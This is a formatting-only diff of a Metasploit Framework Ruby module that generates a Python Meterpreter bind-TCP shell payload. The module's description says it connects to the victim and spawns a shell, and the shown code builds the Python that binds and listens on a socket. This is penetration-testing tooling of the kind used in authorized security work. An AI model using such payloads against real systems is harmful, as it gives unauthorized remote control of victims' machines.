@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -14,20 +12,23 @@ module MetasploitModule
   include Msf::Payload::Python::MeterpreterLoader
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'        => 'Python Meterpreter Shell, Bind TCP Inline',
-      'Description' => 'Connect to the victim and spawn a Meterpreter shell',
-      'Author'      => 'Spencer McIntyre',
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'python',
-      'Arch'        => ARCH_PYTHON,
-      'Handler'     => Msf::Handler::BindTcp,
-      'Session'     => Msf::Sessions::Meterpreter_Python_Python
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Python Meterpreter Shell, Bind TCP Inline',
+        'Description' => 'Connect to the victim and spawn a Meterpreter shell',
+        'Author' => 'Spencer McIntyre',
+        'License' => MSF_LICENSE,
+        'Platform' => 'python',
+        'Arch' => ARCH_PYTHON,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::Meterpreter_Python_Python
+      )
+    )
   end
 
-  def generate_bind_tcp(opts={})
-    socket_setup  = "bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+  def generate_bind_tcp(opts = {})
+    socket_setup = "bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
     socket_setup << "bind_sock.bind(('0.0.0.0', #{opts[:port]}))\n"
     socket_setup << "bind_sock.listen(1)\n"
     socket_setup << "s, address = bind_sock.accept()\n"
